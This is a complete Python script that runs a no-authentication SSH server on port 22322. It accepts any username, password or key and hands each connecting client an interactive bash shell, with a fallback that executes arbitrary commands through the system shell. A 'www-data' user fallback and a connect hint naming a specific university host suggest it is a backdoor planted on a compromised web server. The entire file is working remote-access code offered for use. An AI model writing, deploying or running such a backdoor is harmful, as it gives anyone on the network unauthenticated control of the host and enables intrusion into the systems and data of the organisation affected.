#!/usr/bin/env python3
import paramiko
import socket
import threading
import os
import pty
import select
import sys
import time

PORT = 22322
HOST_KEY = paramiko.RSAKey.generate(2048)

class NoAuthServer(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_none(self, username):
        return paramiko.AUTH_SUCCESSFUL
    
    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL
    
    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_SUCCESSFUL
    
    def get_allowed_auths(self, username):
        return "none,password,publickey"
    
    def check_channel_shell_request(self, channel):
        return True
    
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

def handle_connection(client_sock, addr):
    print(f"[+] Connection from {addr}")
    
    try:
        transport = paramiko.Transport(client_sock)
        transport.add_server_key(HOST_KEY)
        transport.set_subsystem_handler("sftp", paramiko.SFTPServer, paramiko.SFTPServerInterface)
        
        server = NoAuthServer()
        transport.start_server(server=server)
        
        chan = transport.accept(20)
        if chan is None:
            print(f"[-] No channel from {addr}")
            transport.close()
            return
        
        # Send welcome message
        chan.send(f"\nWelcome to SSH Server ({os.uname()[1]})\n")
        chan.send(f"User: {os.getlogin() if hasattr(os, 'getlogin') else 'www-data'}\n")
        chan.send(f"Directory: {os.getcwd()}\n")
        chan.send("=" * 50 + "\n\n")
        
        # Spawn shell
        try:
            # Create pseudo-terminal
            master_fd, slave_fd = pty.openpty()
            
            # Fork process
            pid = os.fork()
            
            if pid == 0:  # Child process
                os.close(master_fd)
                os.setsid()
                os.dup2(slave_fd, 0)
                os.dup2(slave_fd, 1)
                os.dup2(slave_fd, 2)
                os.close(slave_fd)
                
                # Set environment
                env = os.environ.copy()
                env['TERM'] = 'xterm-256color'
                env['USER'] = os.getlogin() if hasattr(os, 'getlogin') else 'www-data'
                env['HOME'] = os.path.expanduser('~')
                env['SHELL'] = '/bin/bash'
                
                os.execve('/bin/bash', ['/bin/bash', '-i'], env)
            else:  # Parent process
                os.close(slave_fd)
                
                # Set non-blocking
                import fcntl
                flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
                fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
                
                # Forward data between channel and PTY
                while True:
                    rlist, _, _ = select.select([chan, master_fd], [], [])
                    
                    if chan in rlist:
                        try:
                            data = chan.recv(1024)
                            if not data:
                                break
                            os.write(master_fd, data)
                        except (OSError, paramiko.SSHException):
                            break
                    
                    if master_fd in rlist:
                        try:
                            data = os.read(master_fd, 1024)
                            if not data:
                                break
                            chan.send(data)
                        except OSError:
                            break
                
                # Cleanup
                os.close(master_fd)
                os.waitpid(pid, 0)
                
        except (ImportError, OSError):
            # Fallback to simple shell if PTY fails
            chan.send("PTY not available, using basic shell\n")
            while True:
                chan.send("$ ")
                try:
                    cmd = chan.recv(1024).decode().strip()
                    if cmd.lower() in ['exit', 'logout', 'quit']:
                        chan.send("Goodbye!\n")
                        break
                    
                    import subprocess
                    try:
                        output = subprocess.check_output(
                            cmd, 
                            shell=True, 
                            stderr=subprocess.STDOUT,
                            timeout=10
                        )
                        chan.send(output)
                    except subprocess.TimeoutExpired:
                        chan.send("Command timed out\n")
                    except Exception as e:
                        chan.send(f"Error: {str(e)}\n".encode())
                        
                except (UnicodeDecodeError, paramiko.SSHException):
                    break
        
        chan.close()
        transport.close()
        print(f"[-] Connection closed: {addr}")
        
    except Exception as e:
        print(f"[-] Error with {addr}: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            client_sock.close()
        except:
            pass

def start_server():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('0.0.0.0', PORT))
    server_sock.listen(10)
    
    print(f"[*] No-Auth SSH Server listening on 0.0.0.0:{PORT}")
    print(f"[*] Host Key Fingerprint: {HOST_KEY.get_fingerprint().hex()}")
    print(f"[*] Connect with: ssh -p {PORT} anyuser@{socket.gethostname()}")
    print(f"[*] Or: ssh -p {PORT} -o PreferredAuthentications=none anyuser@num.univ-biskra.dz")
    print("[*] Waiting for connections...\n")
    
    while True:
        try:
            client, addr = server_sock.accept()
            thread = threading.Thread(target=handle_connection, args=(client, addr), daemon=True)
            thread.start()
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            break
        except Exception as e:
            print(f"[!] Accept error: {e}")

if __name__ == '__main__':
    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
